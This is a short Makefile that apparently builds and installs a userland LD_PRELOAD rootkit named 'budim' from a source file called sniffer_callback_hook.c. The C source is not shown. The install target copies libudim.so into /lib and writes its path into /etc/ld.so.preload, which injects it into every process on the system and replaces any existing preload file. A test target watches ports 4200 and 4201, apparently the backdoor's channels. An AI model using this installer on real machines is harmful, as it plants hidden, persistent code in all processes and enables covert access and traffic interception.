INSTALL=/lib

CFLAGS+= -Wall
LDFLAGS+= -lc -ldl -lutil

all: libudim.so

libudim.so: sniffer_callback_hook.c
	$(CC) -fPIC -g -c sniffer_callback_hook.c
	$(CC) -fPIC -shared -Wl,-soname,libudim.so sniffer_callback_hook.o $(LDFLAGS) -o libudim.so
	strip libudim.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing budim 
	@install -m 0755 libudim.so $(INSTALL)/
	@echo [-] Injecting budim
	@echo $(INSTALL)/libudim.so > /etc/ld.so.preload

uninstall:
	@rm $(INSTALL)/libudim.so
	@rm /etc/ld.so.preload

test:
	sudo tcpdump port 4200 or port 4201

clean:
	rm libudim.so *.o

